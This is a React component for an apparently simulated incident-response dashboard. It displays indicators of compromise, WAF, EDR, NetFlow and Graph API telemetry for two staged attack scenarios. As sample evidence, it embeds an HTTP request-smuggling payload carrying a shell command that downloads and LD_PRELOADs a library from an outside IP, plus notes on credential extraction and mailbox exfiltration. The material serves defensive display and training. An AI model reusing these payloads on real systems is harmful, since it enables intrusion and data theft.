import { useState } from "react"
import { ShieldAlert, Terminal, FileCode, Network, Copy, Check } from "lucide-react"
import type { Incident } from "@/lib/model"

interface IncidentEvidenceProps {
  incident: Incident
}

interface IOCItem {
  value: string
  type: string
  verdict: "critical" | "high" | "warning" | "suspicious"
  containment: string
  mitreTactic: string
}

function getIOCsForIncident(incident: Incident): IOCItem[] {
  if (incident.scenarioId === "zero-day-edge" || incident.code === "PLX-1041" || incident.code === "ESP-1041") {
    return [
      {
        value: "185.121.44.19",
        type: "IPv4 C2 infrastructure",
        verdict: "critical",
        containment: "Perimeter BGP null-route and egress firewall block",
        mitreTactic: "T1071.001 (Web Protocols)",
      },
      {
        value: "cdn-status-check.net",
        type: "Adversary domain",
        verdict: "critical",
        containment: "CoreDNS sinkholed, SNI filtering active",
        mitreTactic: "T1071.004 (DNS)",
      },
      {
        value: "libedgetls.so.2",
        type: "LD_PRELOAD rootkit hook",
        verdict: "critical",
        containment: "Host isolated, hash blocked",
        mitreTactic: "T1574.006 (LD_PRELOAD)",
      },
      {
        value: "svc-deploy",
        type: "Compromised service principal",
        verdict: "high",
        containment: "IAM STS session revoked, credentials rotated",
        mitreTactic: "T1078.004 (Cloud Accounts)",
      },
      {
        value: "edge-gw-01",
        type: "Compromised ingress host",
        verdict: "critical",
        containment: "VLAN quarantined, live memory dump captured",
        mitreTactic: "T1190 (Exploit Public-Facing App)",
      },
    ]
  }

  if (incident.scenarioId === "identity-front" || incident.code === "PLX-1042" || incident.code === "ESP-1042") {
    return [
      {
        value: "app-id 9f31c0",
        type: "Illicit OAuth enterprise app",
        verdict: "critical",
        containment: "Tenant consent revoked, service principal evicted",
        mitreTactic: "T1528 (Application Access Token)",
      },
      {
        value: "cdn-status-check.net",
        type: "OAuth redirect C2 domain",
        verdict: "critical",
        containment: "DNS sinkholed, outbound web proxy blocked",
        mitreTactic: "T1071.001 (Web Protocols)",
      },
      {
        value: "r.almeida",
        type: "Phished corporate account",
        verdict: "high",
        containment: "Active sessions revoked, MFA reset forced",
        mitreTactic: "T1566.002 (Spearphishing Link)",
      },
      {
        value: "corp-idp-01",
        type: "Target identity provider",
        verdict: "high",
        containment: "Audit logs exported, Graph API app locked down",
        mitreTactic: "T1098.005 (Device Registration)",
      },
    ]
  }

  // Fallback for live range or custom
  return incident.indicators.map((ind) => ({
    value: ind,
    type: ind.includes(".") ? (ind.match(/\d+\.\d+\.\d+\.\d+/) ? "IP address" : "Domain name") : "Indicator",
    verdict: "high",
    containment: "Automated containment enforced",
    mitreTactic: "TA0040 (Impact / Defense Evasion)",
  }))
}

export function IncidentEvidence({ incident }: IncidentEvidenceProps) {
  const [activeTab, setActiveTab] = useState<string>("iocs")
  const [copiedValue, setCopiedValue] = useState<string | null>(null)

  const iocs = getIOCsForIncident(incident)

  const copyToClipboard = (text: string) => {
    void navigator.clipboard.writeText(text)
    setCopiedValue(text)
    setTimeout(() => setCopiedValue(null), 2000)
  }

  const isZeroDay = incident.scenarioId === "zero-day-edge" || incident.code === "PLX-1041" || incident.code === "ESP-1041"

  return (
    <div className="flex flex-col gap-3">
      {/* Evidence tabs */}
      <div className="flex items-center gap-5 overflow-x-auto border-b border-rule-soft">
        {[
          { id: "iocs", Icon: ShieldAlert, label: `Indicators (${iocs.length})` },
          { id: "waf", Icon: FileCode, label: isZeroDay ? "WAF telemetry" : "Consent log" },
          { id: "edr", Icon: Terminal, label: isZeroDay ? "EDR process tree" : "Graph API audit" },
          { id: "netflow", Icon: Network, label: isZeroDay ? "NetFlow beaconing" : "Mailbox enumeration" },
        ].map((tab) => (
          <button
            key={tab.id}
            type="button"
            onClick={() => setActiveTab(tab.id)}
            className={`meta-mono -mb-px flex shrink-0 items-center gap-1.5 border-b pb-1.5 transition-colors ${
              activeTab === tab.id
                ? "border-[color:var(--accent)] text-ink"
                : "border-transparent hover:text-ink"
            }`}
          >
            <tab.Icon className="size-3" />
            <span>{tab.label}</span>
          </button>
        ))}
      </div>

      {/* Tab: Indicators of Compromise */}
      {activeTab === "iocs" && (
        <div className="flex flex-col gap-2">
          <div className="flex flex-wrap items-baseline justify-between gap-3 border-b border-rule-soft pb-1.5">
            <span className="title text-[0.875rem]">Threat intelligence and extracted IOCs</span>
            <span className="meta-mono text-accent-indigo!">Swarm verified</span>
          </div>
          <div>
            <ul className="flex flex-col">
              {iocs.map((ioc) => (
                <li key={ioc.value} className="rule-row">
                  <div className="flex min-w-0 flex-col gap-1">
                    <div className="flex flex-wrap items-center gap-x-2.5 gap-y-1">
                      <button
                        type="button"
                        onClick={() => copyToClipboard(ioc.value)}
                        title="Click to copy IOC"
                        className="meta-mono group flex max-w-full items-center gap-1.5 border border-rule-soft px-1.5 py-0.5 text-ink! hover:bg-wash"
                      >
                        <span className="truncate">{ioc.value}</span>
                        {copiedValue === ioc.value ? (
                          <Check className="size-3 text-positive" />
                        ) : (
                          <Copy className="size-3 opacity-40 group-hover:opacity-100" />
                        )}
                      </button>
                      <span className="meta-mono">{ioc.mitreTactic}</span>
                    </div>
                    <span className="prose text-[0.75rem]!">{ioc.type}</span>
                    <span className="meta-mono text-[color:var(--positive)]!">{ioc.containment}</span>
                  </div>
                </li>
              ))}
            </ul>
          </div>
        </div>
      )}

      {/* Tab: WAF / Ingress Telemetry */}
      {activeTab === "waf" && (
        <div className="flex flex-col gap-2">
          <div className="flex flex-wrap items-baseline justify-between gap-3 border-b border-rule-soft pb-1.5">
            <span className="title text-[0.875rem]">{isZeroDay ? "Perimeter ingress HTTP desync artifact" : "Azure AD consent grant event"}</span>
            <span className="meta-mono text-[color:var(--negative)]!">Rule {isZeroDay ? "HTTP-DESYNC-HEURISTIC" : "UNKNOWN-APP-CONSENT"}</span>
          </div>
          <div>
            <div className="overflow-x-auto border border-rule-soft bg-wash p-3 font-mono text-[11px] leading-relaxed text-ink-soft">
              {isZeroDay ? (
                <pre>
{`POST /admin/_health HTTP/1.1
Host: edge-gw-01.corp.internal
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Transfer-Encoding: chunked
Content-Length: 4
X-Forwarded-For: 185.121.44.19
Connection: keep-alive

0

POST /api/v1/internal/exec HTTP/1.1
Host: edge-gw-01.corp.internal
Authorization: Bearer <tampered-jwt-pre-auth>
Content-Type: application/json

{"cmd": "/bin/sh -c 'curl -s http://185.121.44.19/stage2.so -o /tmp/libedgetls.so.2 && LD_PRELOAD=/tmp/libedgetls.so.2'"}
`}
                </pre>
              ) : (
                <pre>
{`{
  "eventId": "evt_consent_9f31c0a8",
  "timestamp": "2026-09-13T02:14:10Z",
  "category": "ApplicationManagement",
  "activityDisplayName": "Consent to application",
  "target": {
    "appId": "9f31c0-481e-4a92",
    "displayName": "Sync-Analytics-V2",
    "publisherDomain": "cdn-status-check.net",
    "verifiedPublisher": false
  },
  "initiatedBy": {
    "userPrincipalName": "r.almeida@corp.internal",
    "department": "Finance",
    "ipAddress": "198.51.100.44"
  },
  "grantedPermissions": [
    "Mail.Read",
    "MailboxSettings.ReadWrite",
    "Files.Read.All",
    "offline_access"
  ],
  "riskScore": 96,
  "verdict": "ANOMALOUS_UNVERIFIED_MULTI_TENANT_OAUTH"
}`}
                </pre>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Tab: EDR Process Tree */}
      {activeTab === "edr" && (
        <div className="flex flex-col gap-2">
          <div className="flex flex-wrap items-baseline justify-between gap-3 border-b border-rule-soft pb-1.5">
            <span className="title text-[0.875rem]">{isZeroDay ? "Host EDR process lineage and memory dump" : "Graph API audit trail"}</span>
            <span className="meta-mono text-[color:var(--warning)]!">{isZeroDay ? "Host edge-gw-01" : "Host corp-fs-03"}</span>
          </div>
          <div>
            <div className="overflow-x-auto border border-rule-soft bg-wash p-3 font-mono text-[11px] leading-relaxed text-ink-soft">
              {isZeroDay ? (
                <pre>
{`[02:14:11] systemd (PID 1)
 └── rivet-edge (PID 1042, user: edge-svc, TLS Terminator)
      └── [ALERT] /bin/sh (PID 2108, user: edge-svc)
           ├── curl -s http://185.121.44.19/stage2.so -o /tmp/libedgetls.so.2 (PID 2109) [RC=0]
           └── python3 -c import os,socket... (PID 2110)
                ├── [INJECTION] LD_PRELOAD=/tmp/libedgetls.so.2 hooked ssl_read/ssl_write
                ├── Socket: 10.0.1.10:49214 -> 185.121.44.19:443 [ESTABLISHED]
                └── Child: svc-deploy credential extraction from /etc/vault/token [T1555]

[CONTAINMENT VERIFICATION]
-> Phalanx Containment Agent Bulwark issued 'isolate_host(edge-gw-01)' at 02:14:48
-> EDR agent killed PID 2108, 2110; removed /tmp/libedgetls.so.2
-> Host isolation confirmed: 0 ingress/egress packets permitted except sensor telemetry`}
                </pre>
              ) : (
                <pre>
{`[02:14:15] OAuth Client 9f31c0 authenticated via token refresh (IP: 185.121.44.19)
[02:14:16] GET /v1.0/users/r.almeida@corp.internal/messages -> 200 OK (50 messages)
[02:14:18] GET /v1.0/sharedMailboxes -> 200 OK (Enumerated 214 finance mailboxes)
[02:14:21] Batch Query: /v1.0/users/finance-team/messages?$search="wire transfer OR invoice"
[02:14:24] 84 sensitive attachments downloaded in 60 seconds (Total 142 MB)

[CONTAINMENT VERIFICATION]
-> Phalanx Identity Keystone revoked OAuth client 9f31c0 via Microsoft Graph API
-> All delegated user refresh tokens invalidated
-> Perimeter proxy blocked outbound requests to cdn-status-check.net`}
                </pre>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Tab: NetFlow / Beaconing Analysis */}
      {activeTab === "netflow" && (
        <div className="flex flex-col gap-2">
          <div className="flex flex-wrap items-baseline justify-between gap-3 border-b border-rule-soft pb-1.5">
            <span className="title text-[0.875rem]">{isZeroDay ? "NetFlow packet and cadence analysis" : "Exfiltration bandwidth and data flow"}</span>
            <span className="meta-mono">Rule {isZeroDay ? "PERIODIC-EGRESS" : "BULK-OBJECT-READ"}</span>
          </div>
          <div>
            <div className="overflow-x-auto border border-rule-soft bg-wash p-3 font-mono text-[11px] leading-relaxed text-ink-soft">
              {isZeroDay ? (
                <pre>
{`Flow Record ID: FLW-2026-9481
Protocol: IP / TCP (443)
Source: 10.0.1.10:49214 (edge-gw-01)
Destination: 185.121.44.19:443 (cdn-status-check.net)

Temporal Characteristics:
• Beacon Interval: 47.18 seconds
• Jitter: ±0.32s (Heuristic score: 0.99 Machine Determinism)
• Total Flow Sessions: 4,102
• Total Exfiltrated: 284 MB (customer export objects from data-obj-01)

Mitigation Executed:
-> iptables -I FORWARD -d 185.121.44.19 -j DROP (Perimeter Gateway)
-> Autonomous DNS sinkhole redirecting cdn-status-check.net to 127.0.0.1
-> 0 remaining active connections detected`}
                </pre>
              ) : (
                <pre>
{`Flow Record ID: FLW-2026-9502
Protocol: HTTPS / Microsoft Graph API REST
Client IP: 185.121.44.19 (Adversary Proxy Node)
Target: Exchange Online / Sharepoint Tenant (corp-fs-03)

Exfiltration Pattern:
• Concurrent HTTP streams: 16
• High-value keywords: "invoice", "bank details", "wire instruction", "private key"
• Bulk object extraction: 3,140 items downloaded
• Interception: Swarm halted exfiltration at minute 2:45 before crown-jewel export bucket reached.`}
                </pre>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
